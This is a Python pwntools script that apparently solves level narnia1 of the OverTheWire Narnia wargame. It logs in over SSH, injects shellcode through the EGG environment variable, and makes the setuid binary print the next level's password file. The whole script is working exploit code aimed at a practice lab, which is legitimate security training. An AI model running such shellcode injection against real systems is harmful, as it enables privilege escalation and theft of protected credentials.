#!/usr/bin/env python2
from __future__ import print_function
import pwn
import getpass
import sys

# Configuration variables
config = {
        'user': 'narnia1',
        'executable': '/narnia/narnia1',
        'password_file_path': '/etc/narnia_pass/narnia2',
        'host': 'narnia.labs.overthewire.org',
        'port': 2226
        }
pwn.context.arch = 'i386'
pwn.context.os = 'linux'

# Get password for SSH login
try:
    password = getpass.getpass(prompt='{} password: '.format(config['user']))
except Exception as e:
    print('[-] Error getting password: ' + e)
    sys.exit(-1)

# Login to SSH
s = pwn.tubes.ssh.ssh(host=config['host'],
                      port=config['port'],
                      user=config['user'],
                      password=password)

# Prepare exploit
asm = pwn.shellcraft.i386.linux.cat('/etc/narnia_pass/narnia2')
shellcode = pwn.asm(asm)

payload = shellcode

# Send exploit and get password
p = s.process(executable=config['executable'],
              env={'EGG': payload},
              raw=True)
p.recvline()
print('Narnia2 password: {}'.format(p.recvline()))

p.close()
s.close()
